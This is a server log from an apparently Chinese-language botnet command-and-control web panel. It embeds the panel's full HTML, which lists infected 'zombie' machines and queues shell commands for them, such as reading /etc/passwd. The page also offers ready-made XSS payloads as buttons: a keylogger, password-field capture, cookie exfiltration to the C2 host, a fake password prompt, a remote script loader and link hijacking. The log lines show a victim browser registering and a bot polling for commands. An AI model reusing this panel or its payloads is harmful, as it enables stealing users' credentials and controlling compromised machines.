100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:36:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:24] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:36:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:36:25 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:36:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:36:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:25] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:36:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:25 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:36:25 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:36:25.633Z"}', None, '2025-06-26 22:36:25.639088', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:36:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:25] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:36:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:36:25 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:36:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:36:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:25] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:36:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 289 bytes [200 OK]>
